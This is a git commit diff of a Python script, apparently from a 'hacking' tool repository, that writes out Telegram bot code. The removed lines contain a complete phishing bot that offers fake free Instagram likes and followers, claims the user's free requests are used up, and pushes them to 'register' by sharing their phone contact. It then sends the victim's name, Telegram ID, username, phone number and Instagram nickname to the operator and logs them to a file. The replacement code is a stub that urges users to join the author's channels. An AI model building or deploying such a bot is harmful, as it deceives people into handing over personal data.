09f145d86f1c7e4da77d4a60f98d4f51e86f4797
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2023-09-22 00:21:52 +0530

    Update 3.py

--- 3.py
+++ 3.py
@@ -259,139 +259,15 @@ bot.polling()
 
     elif choice == 2:
         # Code for choice 2 (Instagram cheat)
-        f = open('probiv2.py', 'w+', encoding='utf-8')
+        f = open('instbot.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
-from telebot import types
-import time
-import random
 
-
-log = open('bot-log.txt', 'a+', encoding='utf-8')
 ID = '{userid}'
-bot = telebot.TeleBot("{token}")
-bot.send_message(ID, '!BOT STARTED!')
-print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n") 
-@bot.message_handler(commands=['start'])
-def start(message):
-	bot.send_message(message.chat.id, '''👋 Hello! 👋
-This is a bot for getting likes and subscribers on Instagram!
-To start, write /getfollowers''') 
-@bot.message_handler(commands=['OnlineHacking'])
-def start(message):
-	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
-@bot.message_handler(commands=['getfollowers'])
-def start(message):
-	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-	first_button = types.InlineKeyboardButton(text="Likes", callback_data="first")
-	second_button = types.InlineKeyboardButton(text="Followers", callback_data="second")
-	keyboardmain.add(first_button, second_button)
-	bot.send_message(message.chat.id, "Select a promotion item:", reply_markup=keyboardmain)
+bot = telebot.TeleBot("{token}")  
 
-@bot.callback_query_handler(func=lambda call:True)
-def callback_inline(call):
-	if call.data == "first":
-		msg = bot.send_message(call.message.chat.id, 'Enter the number of likes (max. 500)') 
-		bot.register_next_step_handler(msg, proc1)
-
-	elif call.data == "second":
-		msg = bot.send_message(call.message.chat.id, 'Enter the number of Followers (no more than 500)') 
-		bot.register_next_step_handler(msg, proc2)
-
-def proc1(message):
-	try:
-		num = message.text
-		m_id = message.chat.id
-
-		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
-			return
-		if int(num) > 500:
-			bot.reply_to(message, 'The number of likes cannot be more than 500!')
-			return
-
-
-		time.sleep(2)
-		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
-		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
-To receive additional requests, register in the bot!''', reply_markup=keyboard)
-	except Exception as e:
-		bot.send_message(ID, e)
-		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-
-
-def proc2(message):
-	try:
-		num = message.text
-		m_id = message.chat.id
-
-		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
-			return
-
-		if int(num) > 500:
-			bot.reply_to(message, 'The number of followers cannot be more than 500!')
-			return
-
-		time.sleep(2)
-		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
-		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
-To receive additional requests, register in the bot!''', reply_markup=keyboard)
-
-	except Exception as e:
-		bot.send_message(ID, e)
-		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-
-@bot.message_handler(content_types=['contact']) 
-def contact(message):
-	if message.contact is not None: 
-		nick = message.from_user.username
-		first = message.contact.first_name
-		last = message.contact.last_name
-		userid = message.contact.user_id
-		phone = message.contact.phone_number
-		info = f'''
-			Data
-			├Name: {{first}} {{last}}
-			├ID: {{userid}}
-			├Nick: @{{nick}}
-			└Phone number: {{phone}}
-   
-      🎭 Follow @OnlineHacking for more...
-      '''
-
-		bot.send_message(ID, info)
-		print(info)
-
-		log = open('bot-log.txt', 'a+', encoding='utf-8')
-		log.write(info + '  ')
-		log.close()
-
-		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, 'Submit your contact!')
-		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
-		time.sleep(1)
-		msg = bot.send_message(message.chat.id, 'Enter your Instagram Nickname:') 
-		bot.register_next_step_handler(msg, entr)
-
-def entr(message):
-	try:
-		inp = message.text
-		m_id = message.chat.id
-
-		bot.reply_to(message, f'Nick: {{inp}} ')#⏳
-		bot.send_message(ID, f'Nick on Instagram: {{inp}}')
-		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
-	except Exception as e:
-		bot.send_message(ID, e)
-		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-bot.polling()
-
-
+def start_bot():
+    print("\n\n\033[91m[\033[92mNO ACTIVE\033[91m] \033[0mFirst you open your telegram bot and see there is a message and join our 2 telegram channel and check after joining if the check is successful then it will be active then you can use bot\n\n")
         """)
         f.close()
         print("The probiv2.py file is saved")
